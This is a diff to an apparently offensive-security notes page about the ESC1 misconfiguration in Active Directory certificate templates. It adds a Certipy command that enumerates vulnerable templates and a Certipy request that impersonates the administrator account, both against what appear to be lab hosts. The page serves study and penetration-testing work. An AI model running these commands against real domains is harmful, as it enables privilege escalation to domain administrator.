@@ -23,6 +23,8 @@ layout:
 
 # 1️⃣ ESC1
 
+### Templates vulnerable
+
 Templates vulnerable to ESC1 have the following configurations:
 
 * Client Authentication: True
@@ -41,14 +43,16 @@ Templates vulnerable to ESC1 have the following configurations:
 
 **ESC1 Requirement 5: No authorized signatures are required.**
 
-\
-\
+### ESC1 Enumeration
 
+```sh
+certipy find -vulnerable -u attacker@rfs.lan -p 'P@ssw0rd' -dc-ip 192.168.1.20 -stdout
+```
 
-\
+### Exploitation of ESC1 <a href="#exploitation-of-esc1" id="exploitation-of-esc1"></a>
 
-
->
->
-> \
-> SpectorOps
+{% code overflow="wrap" %}
+```sh
+certipy req -u attacker -p 'P@ssw0rd' -target-ip 192.168.1.2 -ca 'lab-DC-CA' -template 'ESC1' -upn 'administrator@rfs.lan'
+```
+{% endcode %}
